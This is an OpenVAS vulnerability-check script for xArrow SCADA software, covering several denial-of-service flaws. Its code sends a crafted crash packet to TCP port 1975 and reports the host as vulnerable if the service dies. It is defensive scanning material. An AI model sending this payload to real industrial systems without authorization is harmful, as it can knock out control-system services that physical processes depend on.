###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xarrow_mult_dos_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
#
# xArrow Multiple Denial of Service Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802635");
  script_version("$Revision: 4690 $");
  script_bugtraq_id(52307);
  script_cve_id("CVE-2012-2426", "CVE-2012-2427", "CVE-2012-2428", "CVE-2012-2429");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
  script_tag(name:"creation_date", value:"2012-06-07 11:11:11 +0530 (Thu, 07 Jun 2012)");
  script_name("xArrow Multiple Denial of Service Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(1975);

  script_xref(name:"URL", value:"http://secunia.com/advisories/48276");
  script_xref(name:"URL", value:"http://aluigi.org/adv/xarrow_1-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-12-145-02.pdf");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-12-065-01.pdf");

  tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  or cause the application to crash.

  Impact Level: System/Application";

  tag_affected = "xArrow versions before 3.4.1";

  tag_insight = "- A NULL-pointer dereference error in SCADA.exe due to missing validation
    when allocating memory can be exploited to cause a crash via a specially
    crafted packet sent to TCP port 1975.
  - An error in SCADA.exe when allocating memory to process certain packets
    can be exploited to cause limited memory corruption and crash the service
    via a specially crafted packet sent to TCP port 1975.
  - An integer overflow error in SCADA.exe when processing certain packets can
    be exploited to cause a crash via a specially crafted datagram sent to UDP
    port 1974.
  - An error in SCADA.exe when processing certain packets can be exploited to
    cause a crash via a specially crafted datagram sent to UDP port 1974.";

  tag_solution = "Upgrade to xArrow version 3.4.1 or later,
  For updates refer to http://www.xarrow.net/";

  tag_summary = "This host is running xArrow and is prone to multiple denial of
  service vulnerabilities.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


## Variable Initialization
soc = 0;
soc1 = 0;
port = 0;
req = "";
res = "";

## xArrow Port
port = 1975;
if(! get_port_state(port)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(! soc) {
  exit(0);
}

## Confirm the application before trying exploit
res = recv(socket:soc, length:1024);

## Check xArrow Header
if(res !~ '^\xeb\0x90\xeb\x90\xeb\x90*')
{
  close(soc);
  exit(0);
}

## Construct Attack Request
header = raw_string( 0xeb, 0x90, 0xeb, 0x90, 0xeb, 0x90, 0xa3, 0xa3, 0xa3,
                     0xa3, 0x38, 0x5c, 0x5c, 0x5c, 0x55, 0x8b, 0xcc, 0xb7);

req = header + crap(data: 'a', length: 100);

## Send Attack
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

sleep(3);

## Open the socket and check xArrow is dead or alive
soc1 = open_sock_tcp(port);
if(!soc1)
{
  security_message(port);
  exit(0);
}
close(soc1);
